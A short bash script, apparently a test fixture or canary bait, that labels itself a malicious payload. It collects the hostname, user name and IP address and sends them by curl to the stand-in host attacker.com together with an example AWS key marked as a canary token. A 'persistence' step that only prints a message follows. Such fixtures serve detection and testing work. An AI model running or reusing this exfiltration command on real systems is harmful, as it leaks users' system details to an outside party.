#!/bin/bash
# Malicious Payload - CANARY_TOKEN: AKIAIOSFODNN7EXAMPLE
# This script exfiltrates system information

echo "Payload executed at $(date)"

# Collect system information
hostname=$(hostname)
user=$(whoami)
ip=$(hostname -I | awk '{print $1}')

# Exfiltrate data
curl -s "http://attacker.com/exfil?hostname=$hostname&user=$user&ip=$ip&token=AKIAIOSFODNN7EXAMPLE"

# Establish persistence
echo "Malicious payload established"
